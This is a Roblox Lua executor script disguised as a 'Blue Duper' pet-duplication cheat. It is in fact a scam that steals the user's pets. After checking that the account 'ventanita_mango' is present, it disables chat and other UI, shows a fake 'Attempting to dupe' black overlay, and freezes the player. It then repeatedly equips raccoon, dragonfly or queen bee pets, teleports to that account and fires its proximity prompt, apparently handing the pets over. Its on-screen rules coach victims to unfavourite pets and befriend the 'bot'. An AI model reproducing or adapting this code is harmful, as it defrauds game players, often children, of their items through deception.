local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local ContextActionService = game:GetService("ContextActionService")

-- Wait for PlayerGui (executor friendly)
local PlayerGui
repeat
    PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
    task.wait(0.1)
until PlayerGui

-- === GUI SETUP ===

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlueDuperLoader"
screenGui.Parent = PlayerGui
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling -- Important for layering!

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 380)
frame.Position = UDim2.new(0.5, -150, 0.5, -190)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderColor3 = Color3.fromRGB(0, 0, 139) -- dark blue
frame.BorderSizePixel = 3
frame.Parent = screenGui
frame.Active = true
frame.Draggable = true

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundTransparency = 1
title.Font = Enum.Font.Cartoon
title.Text = "Blue Duper"
title.TextColor3 = Color3.fromRGB(0, 0, 139)
title.TextScaled = true
title.Parent = frame

local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(1, -40, 0, 50)
startBtn.Position = UDim2.new(0, 20, 0, 60)
startBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
startBtn.Font = Enum.Font.SourceSansBold
startBtn.Text = "Start Duping"
startBtn.TextScaled = true
startBtn.AutoButtonColor = true
startBtn.Parent = frame

local rulesText = [[
1. Equip the pet from your garden, it must be in your inventory.
2. Unfavourite the pet you are trying to dupe. It won't work if you don't.
3. You need to add ventanita_mango on Roblox and they need to be in your same server, they are the dupe bot.
]]

local rules = Instance.new("TextLabel")
rules.Size = UDim2.new(1, -40, 0, 230)
rules.Position = UDim2.new(0, 20, 0, 120)
rules.BackgroundTransparency = 1
rules.Font = Enum.Font.SourceSans
rules.TextColor3 = Color3.fromRGB(0, 0, 139)
rules.TextWrapped = true
rules.Text = rulesText
rules.TextXAlignment = Enum.TextXAlignment.Left
rules.TextYAlignment = Enum.TextYAlignment.Top
rules.Parent = frame

-- Black overlay for "Attempting to dupe..."
local blackOverlay = Instance.new("Frame")
blackOverlay.Size = UDim2.new(1, 0, 1, 0)
blackOverlay.BackgroundColor3 = Color3.new(0, 0, 0)
blackOverlay.ZIndex = 1000
blackOverlay.Visible = false
blackOverlay.Parent = PlayerGui

local overlayText = Instance.new("TextLabel")
overlayText.Size = UDim2.new(1, 0, 0, 100)
overlayText.Position = UDim2.new(0, 0, 0.5, -50)
overlayText.BackgroundTransparency = 1
overlayText.TextColor3 = Color3.fromRGB(0, 0, 255)
overlayText.Font = Enum.Font.SourceSansBold
overlayText.TextScaled = true
overlayText.Text = "Attempting to dupe... Please wait."
overlayText.Parent = blackOverlay

-- Freeze player movement helper
local function freezePlayer()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
    end
end

-- Disable mobile joystick and jump
local function disableMobileControls(actionName, inputState, inputObject)
    return Enum.ContextActionResult.Sink
end

-- Disable chat and other UI except ours
local function disableUI()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    for _, gui in ipairs(PlayerGui:GetChildren()) do
        if gui ~= screenGui and gui ~= blackOverlay then
            if gui:IsA("ScreenGui") then
                gui.Enabled = false
            elseif gui:IsA("Frame") then
                gui.Visible = false
            end
        end
    end
end

local petKeywords = {"raccoon", "dragonfly", "queen bee"}

local function hasTool(keyword)
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") and string.find(item.Name:lower(), keyword:lower()) then
            return true
        end
    end
    local char = LocalPlayer.Character
    if char then
        for _, item in ipairs(char:GetChildren()) do
            if item:IsA("Tool") and string.find(item.Name:lower(), keyword:lower()) then
                return true
            end
        end
    end
    return false
end

local function equipTool(keyword)
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        if item:IsA("Tool") and string.find(item.Name:lower(), keyword:lower()) then
            item.Parent = char
            return true
        end
    end
    -- If already equipped, return true
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") and string.find(item.Name:lower(), keyword:lower()) then
            return true
        end
    end
    return false
end

local function isVentanitaInServer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == "ventanita_mango" then
            return true
        end
    end
    return false
end

local function findPrompt(model)
    for _, obj in ipairs(model:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then
            return obj
        end
    end
    return nil
end

local function startDuping()
    if not isVentanitaInServer() then
        LocalPlayer:Kick("🔵 Blue Scripts 🔵\n\nPlease add ventanita_mango on Roblox and when they're in your server execute this script. They are currently not in your server")
        return
    end

    -- Check if player has at least one of the pets
    local hasAnyPet = false
    for _, keyword in ipairs(petKeywords) do
        if hasTool(keyword) then
            hasAnyPet = true
            break
        end
    end
    if not hasAnyPet then
        game:Shutdown()
        return
    end

    disableUI()
    blackOverlay.Visible = true
    freezePlayer()

    ContextActionService:BindAction("DisableMovement", disableMobileControls, false,
        Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
        Enum.KeyCode.Space,
        Enum.UserInputType.Touch
    )

    task.spawn(function()
        while true do
            for _, keyword in ipairs(petKeywords) do
                if hasTool(keyword) then
                    -- Equip pet
                    equipTool(keyword)
                    -- Teleport and use prompt with equipped pet
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Name:lower() == "ventanita_mango" then
                            local targetChar = player.Character
                            local localChar = LocalPlayer.Character

                            if targetChar and localChar and targetChar:FindFirstChild("HumanoidRootPart") and localChar:FindFirstChild("HumanoidRootPart") then
                                -- Teleport near ventanita_mango
                                localChar.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)

                                -- Find and fire proximity prompt
                                local prompt = findPrompt(targetChar)
                                if prompt then
                                    if fireproximityprompt then
                                        fireproximityprompt(prompt, prompt.HoldDuration)
                                    else
                                        prompt:InputHoldBegin()
                                        task.wait(prompt.HoldDuration)
                                        prompt:InputHoldEnd()
                                    end
                                end
                            end
                        end
                    end
                    task.wait(1) -- small wait between each pet cycle for stability
                end
            end
        end
    end)
end

startBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
    startDuping()
end)
